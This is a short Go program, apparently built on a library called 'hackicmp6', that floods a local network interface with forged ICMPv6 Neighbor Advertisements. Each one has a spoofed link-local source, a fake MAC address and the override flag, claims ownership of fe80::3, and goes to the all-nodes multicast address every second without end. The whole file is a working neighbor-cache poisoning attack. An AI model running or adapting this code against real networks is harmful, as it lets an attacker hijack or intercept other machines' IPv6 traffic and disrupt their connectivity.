package main

import (
	"fmt"
	"github.com/BobBurns/hackicmp6/hi6"
	"os"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("must specify interface!")
		os.Exit(-1)
	}
	t := hi6.ICMP6{
		Iface:      os.Args[1],
		DstIP:      "ff02::1",
		SrcIP:      "fe80::dead:beef",
		SrcMAC:     "10:0b:a9:ba:aa:ad",
		DstMAC:     "33:33:00:00:00:01",
		Type:       hi6.ICMPTypeNeighborAdvertisement,
		Code:       0,
		NA_Flags:   hi6.NA_FLAG_OVERRIDE,
		TargetAddr: "fe80::3",
	}

	err := t.BuildICMPPacket()
	if err != nil {
		fmt.Println("errors found...")
		fmt.Println(err)
		fmt.Println("exiting.")
		os.Exit(-1)
	}
	for {
		fmt.Printf(".")
		err = t.Send()
		if err != nil {
			fmt.Println(err)
			os.Exit(-1)
		}
		time.Sleep(time.Duration(1 * time.Second))
	}

}
